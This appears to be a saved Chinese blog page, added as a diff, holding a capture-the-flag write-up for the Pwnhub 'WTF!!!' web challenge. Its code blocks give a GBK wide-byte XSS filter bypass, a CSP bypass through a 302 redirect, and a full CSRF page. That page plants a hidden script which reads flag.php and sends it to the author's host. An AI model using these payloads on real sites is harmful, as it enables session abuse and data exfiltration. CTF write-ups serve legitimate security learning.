@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+
+<html lang="zh-cn">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Pwnhub-WTF!!!-Writeup - l3m0n - 博客园</title>
+<link href="./Pwnhub-WTF!!!-Writeup - l3m0n - 博客园/blog-common.cssv=m_FXmwz3wxZoecUwNEK23PAzc-j9vbX_C6MblJ5ouMc1" rel="stylesheet" type="text/css"/>
+<link href="./Pwnhub-WTF!!!-Writeup - l3m0n - 博客园/bundle-InsideDotNet.cssv=hm5Ncnf1UmSaS2roxKOjrIG9bKc-5gPzmHFjhD4ZWn01" id="MainCss" rel="stylesheet" type="text/css"/>
+<link href="./Pwnhub-WTF!!!-Writeup - l3m0n - 博客园/bundle-InsideDotNet-mobile.cssv=riNccSBaYfFlRjQw4oW6Q_6u5zO0NRZr85vSvhPWcl01" id="mobile-style" media="only screen and (max-width: 768px)" rel="stylesheet" type="text/css"/>
+<link href="./Pwnhub-WTF!!!-Writeup - l3m0n - 博客园/rss" rel="alternate" title="RSS" type="application/rss+xml"/>
+<link href="./Pwnhub-WTF!!!-Writeup - l3m0n - 博客园/rsd.xml" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./Pwnhub-WTF!!!-Writeup - l3m0n - 博客园/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<script src="./Pwnhub-WTF!!!-Writeup - l3m0n - 博客园/jquery.js" type="text/javascript"></script>
+<script type="text/javascript">var currentBlogApp = 'iamstudy', cb_enable_mathjax=true;var isLogined=false;</script>
+<script src="./Pwnhub-WTF!!!-Writeup - l3m0n - 博客园/blog-common.jsv=CPv0EEqm9L2aCgolHxaZfVYM6J-Sn5az_FJXbjzgr-o1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+<!--done-->
+<div id="home">
+<div id="header">
+<div id="blogTitle">
+<div style="display:none"><img alt="谨以此模板祝贺【博客园开发者征途】系列图书《你必须知道的.net》出版发行" src="./Pwnhub-WTF!!!-Writeup - l3m0n - 博客园/top.gif"/></div>
+<a href="http://www.cnblogs.com/iamstudy/" id="lnkBlogLogo"><img alt="返回主页" id="blogLogo" src="./Pwnhub-WTF!!!-Writeup - l3m0n - 博客园/logo.gif"/></a>
+<!--done-->
+<h1><a class="headermaintitle" href="http://www.cnblogs.com/iamstudy/" id="Header1_HeaderTitle">l3m0n</a></h1>
+<h2></h2>
+</div><!--end: blogTitle 博客的标题和副标题 -->
+<div id="navigator">
+<ul id="navList">
+<li></li>
+<li><a class="menu" href="http://ing.cnblogs.com/" id="MyLinks1_SpaceLink">闪存</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/" id="blog_nav_myhome">首页</a></li>
+<li></li>
+<li></li>
+<li><a class="menu" href="https://i.cnblogs.com/" id="blog_nav_admin" rel="nofollow">管理</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss">订阅</a>
+<a class="aHeaderXML" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss_image"><img alt="订阅" src="./Pwnhub-WTF!!!-Writeup - l3m0n - 博客园/xml.gif"/></a></li>
+</ul>
+<div class="clear"></div>
+<div class="blogStats">
+<div id="blog_stats">
+<!--done-->
+随笔- 1 
+文章- 65 
+评论- 17 
+</div>
+</div><!--end: blogStats -->
+</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+<div id="mainContent">
+<div class="forFlow">
+<div id="post_detail">
+<!--done-->
+<div id="topics">
+<div class="post">
+<h1 class="postTitle">
+<a class="postTitle2" href="http://www.cnblogs.com/iamstudy/articles/pwnhub_wtf_writeup.html" id="cb_post_title_url">Pwnhub-WTF!!!-Writeup</a>
+</h1>
+<div class="clear"></div>
+<div class="postBody">
+<div class="cnblogs-markdown" id="cnblogs_post_body"><p>先膜一发火日巨佬。</p>
+<p>注册帐号后登陆进去看到源代码的一些信息。</p>
+<p><img src="./Pwnhub-WTF!!!-Writeup - l3m0n - 博客园/804631-20161211213002257-1125681406.png"/></p>
+<p>过滤了双引号、单引号、左尖括号、右尖括号，而且还转义了。前面看到页面是GBK，所以尝试了一下宽字符，发现是可以xss的。</p>
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
+String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)
+
+POST内容：
+
+%aa\74img onerror=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) src=a%aa\76</code></pre>
+<p>用burp发包了一下。最后到浏览器经过dom，可以实现弹框。</p>
+<p><img src="./Pwnhub-WTF!!!-Writeup - l3m0n - 博客园/804631-20161211213208741-1604361217.png"/></p>
+<p>当时发现能xss，于是就把自己的页面发给report bugs。后面看到提示</p>
+<pre><code>- 2016.12.10 00:00:00admin只是一个用户名 没有特权</code></pre>
+<p>才意识到，这是一个self-xss，而且admin并没有权限去访问你的页面…另外cookie好像是使用httponly。自己测试自己用户的时候并不能拿到cookie<br/>
+所以可以使用csrf去给管理员添加一个含有xss代码的文章页面，再去访问那个页面，从而导致self-xss代码执行。在弄那个report bugs的时候发现好些也不能发送其他域名的地址。后面抓包找到了一个跳转。</p>
+<pre><code>http://54.223.108.205:23333/login.php?redirecturl=http://54.223.108.205:23333/new.php</code></pre>
+<p>所以可以开始进行构造。</p>
+<p>csrf页面，进行文章的添加，要注意的是，js里面<code>\74</code>url编码会自己转换为字符的，另外最关键的就是宽字节的高位，%aa是不行的，用一个中文字符，然后unescape一下就好了。<code>%u8FD8%5c74</code> ，其中xss的代码是获取flag.php的内容，然后再将这些发给自己的ip。</p>
+<p>另外的问题就是csp的绕过，利用302的跳转就可以了：</p>
+<pre><code>http://www.cnblogs.com/iamstudy/articles/bypass_csp_study.html</code></pre>
+<pre><code>&lt;script&gt;
+love=function(){var c={version:{name:"Elastic Love",author:"quininer",version:"141229"},conf:{protocol:"{{= protocol }}",host:"{{= host }}",id:"{{= id }}"},run:{jsonp:{},args:{},data:{},foo:{}},op:{bind:function(a,b,d){a.addEventListener?a.addEventListener(b,d,!1):a.attachEvent("on"+b,d);return a},random:function(a){return a?Math.random().toString(36).slice(2):1E5*Math.random()}}};c.get={isorigin:function(a,b){var d=c.dom.create("a",{href:a}),f=c.dom.create("a",{href:b||document.location.origin});return d.protocol==f.protocol&amp;&amp;d.hostname==f.hostname&amp;&amp;d.port==f.port?!0:!1},testorigin:function(a){try{c.req.ajax(a)}catch(b){return 19!=b.code?!0:!1}return!0},protocol:c.conf.protocol?c.conf.protocol:"file:"==location.protocol?"http:":"",isdom:function(a){return a.nodeType?!0:!1},id:function(a){return document.getElementById(a)},name:function(a){return document.getElementsByName(a)},tag:function(a){return document.getElementsByTagName(a)},class:function(a){return document.getElementsByClassName(a)},html:function(){return this.tag("html")[0]||document.write("&lt;html&gt;")&amp;this.tag("html")[0]},head:function(){return this.tag("head")[0]||c.dom.add("head",!1,this.html())},body:function(){return this.tag("body")[0]||c.dom.add("body",!1,this.html())}};c.dom={inner:function(a,b,d){var f=Array.prototype.slice.call(arguments,-1)[0];d=d&amp;&amp;c.get.isdom(d)?d:c.get.body();var e=c.dom.create("div");e.innerHTML=a;e=e.children[0];b&amp;&amp;"function"!=typeof b&amp;&amp;(e.style.display="none");this.insert(e,d,"function"==typeof f&amp;&amp;f);return e},create:function(a,b){var d=document.createElement(a);for(i in b)"string"==typeof b[i]&amp;&amp;this.attr(d,i,b[i]);return d},insert:function(a,b){var d=Array.prototype.slice.call(arguments,-1)[0];b=b&amp;&amp;c.get.isdom(b)?b:c.get.body();b.appendChild(a);"function"==typeof d&amp;&amp;d(a,b);return a},add:function(a,b,d){var c=Array.prototype.slice.call(arguments,-1)[0],e=this.create(a,b);this.insert(e,d,c);return e},kill:function(a){var b=Array.prototype.slice.call(arguments,-1)[0];c.get.isdom(a)&amp;&amp;a.parentNode.removeChild(a);"function"==typeof b&amp;&amp;b()},attr:function(a,b,c){if(!c)return(a.attributes[b]||{}).value;a.setAttribute(b,c);return a}};c.req={post:function(a,b,d){var f=Array.prototype.slice.call(arguments,-1)[0],e=c.dom.add("form",{method:"POST",style:"display: none;",action:a},c.get.body());if(b&amp;&amp;"object"==typeof b)for(var g in b)c.dom.add("input",{name:g,value:b[g]},e);g=c.dom.add("input",{type:"submit"},e);if(!d||"function"==typeof d){var h=c.dom.inner('&lt;iframe sandbox name="'+c.op.random(!0)+'"&gt;',!0);c.dom.attr(e,"target",h.name)}"function"==typeof f&amp;&amp;c.op.bind(e,"submit",f);d&amp;&amp;"function"!=typeof d||c.op.bind(h,"load",function(){c.dom.kill(h)});g.click();d&amp;&amp;"function"!=typeof d||c.dom.kill(e)}};return c}();
+love.req.post("http://54.223.108.205:23333/new.php", {
+    title: "lemon",
+    content: unescape("2a%u8FD8%5c74img onerror=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,118,97,114,32,120,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,120,46,111,112,101,110,40,34,71,69,84,34,44,34,102,108,97,103,46,112,104,112,34,44,102,97,108,115,101,41,59,120,46,115,101,110,100,40,110,117,108,108,41,59,108,111,99,97,116,105,111,110,61,39,47,47,105,112,47,39,43,101,115,99,97,112,101,40,120,46,114,101,115,112,111,110,115,101,84,101,120,116,41,59,60,47,115,99,114,105,112,116,62)) src=a%u8FD8%5c76"),
+    submit: "submit"
+}, true);
+&lt;/script&gt;</code></pre>
+<p>最后就可以进行提交bug了，这时候admin就会被添加一个文章。</p>
+<pre><code>http://54.223.108.205:23333/login.php?redirecturl=//ip/c.html</code></pre>
+<p>再进行文章的访问：</p>
+<pre><code>http://54.223.108.205:23333/login.php?redirecturl=//ip/c1.html
+
+&lt;script&gt;
+location="http://54.223.108.205:23333/view.php?id=MTU2MTg3";
+&lt;/script&gt;</code></pre>
+<p>其中id是数字递增的，可以等c.html被访问后，也就是admin创建一篇文章后，立刻再用其他用户账户新建一篇文章，然后看其id，进行一个推测(admin创建文章的id)。</p>
+<p><img src="./Pwnhub-WTF!!!-Writeup - l3m0n - 博客园/804631-20161211213228554-2093814688.png"/></p>
+<hr/>
+<h3 id="题外话">题外话</h3>
+<p>看到其他大佬们在做这个题目的时候还遇上了一些其它的坑，比如。<br/>
+1、获取flag.php网页的内容的时候用base64编码了一下。然后内容存在~~~~<br/>
+编码的时候就会出现<code>+</code>，这个符号在url中表示为空格，＝。＝，后面的数据也就接收不到啦。</p>
+<p>2、另外的就是bot用的是firefox去触发self-xss，csp的话，chrome的那个link预加载是不行的，如果不用302跳转的话，自己测试的预加载也就dns可以弄，但是那个数据处理会有点麻烦。</p>
+<p>3、注意flag.php内容用escape去编码一下，flag中是中文形式，不编码返回的东西就会有点问题。</p>
+</div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+</div>
+<div class="postDesc">posted @ <span id="post-date">2016-12-11 21:34</span> <a href="http://www.cnblogs.com/iamstudy/">l3m0n</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href="https://i.cnblogs.com/EditArticles.aspx?postid=6160662" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(6160662);return false;">收藏</a></div>
+</div>
+<script src="./Pwnhub-WTF!!!-Writeup - l3m0n - 博客园/highlight.min.jsid=20160127"></script><script>markdown_highlight();</script><script type="text/javascript">var allowComments=true,cb_blogId=242399,cb_entryId=6160662,cb_blogApp=currentBlogApp,cb_blogUserGuid='f80873d6-234e-e511-b908-9dcfd8948a71',cb_entryCreatedDate='2016/12/11 21:34:00';loadViewCount(cb_entryId);</script>
+</div><!--end: topics 文章、评论容器-->
+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div class="commentform" id="comment_form">
+<a name="commentform"></a>
+<div id="divCommentShow"></div>
+<div id="comment_nav"><span id="span_refresh_tips"></span><a clientidmode="Static" href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();" runat="server">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+<div id="comment_form_container"></div>
+<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+<div id="ad_t2"></div>
+<div id="opt_under_post"></div>
+<div class="c_ad_block" id="cnblogs_c1"></div>
+<div id="under_post_news"></div>
+<div class="c_ad_block" id="cnblogs_c2"></div>
+<div id="under_post_kb"></div>
+<div class="c_ad_block" id="HistoryToday"></div>
+<script type="text/javascript">
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverAdT2();
+    deliverAdC1();
+    deliverAdC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
+</script>
+</div>
+</div><!--end: forFlow -->
+</div><!--end: mainContent 主体内容容器-->
+<div id="sideBar">
+<div id="sideBarMain">
+<!--done-->
+<div class="newsItem">
+<h3 class="catListTitle">公告</h3>
+<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
+</div>
+<div id="calendar"><div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
+<div id="leftcontentcontainer">
+<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+</div>
+</div><!--end: sideBarMain -->
+</div><!--end: sideBar 侧边栏容器 -->
+<div class="clear"></div>
+<div class="clear"></div>
+</div><!--end: main -->
+<div class="clear"></div>
+<div id="footer">
+<!--done-->
+Copyright ©2017 l3m0n 谨以此模板祝贺【博客园开发者征途】系列图书之《你必须知道的.NET》出版发行
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+<!--PageEndHtml Block Begin-->
+<div align="center" id="something">
+<script language="javascript" src="./Pwnhub-WTF!!!-Writeup - l3m0n - 博客园/18599866.js" type="text/javascript"></script>
+<noscript><a href="//www.51.la/?18599866" target="_blank"><img alt="我要啦免费统计" src="./Pwnhub-WTF!!!-Writeup - l3m0n - 博客园/18599866.asp" style="border:none"/></a></noscript>
+<script language="javascript" src="./Pwnhub-WTF!!!-Writeup - l3m0n - 博客园/id=18599866&amp;mb=3" type="text/javascript"></script>
+</div>
+<script>
+$('#footer').html('Copyright &copy;2017 Syclover-l3m0n');
+console.log('Hello,welcome to my blog!!!\n                  --------l3m0n');
+window.onload=function(){
+  $('#q').css({'width':'100px'});
+  $('#under_post_news').html('');
+  $('#under_post_kb').html('');
+  $('#ad_t2').html('');
+  $('#cnblogs_c1').html('');
+  $('#cnblogs_c2').html('');
+}
+</script>
+<!--PageEndHtml Block End-->
+</body>
+</html>
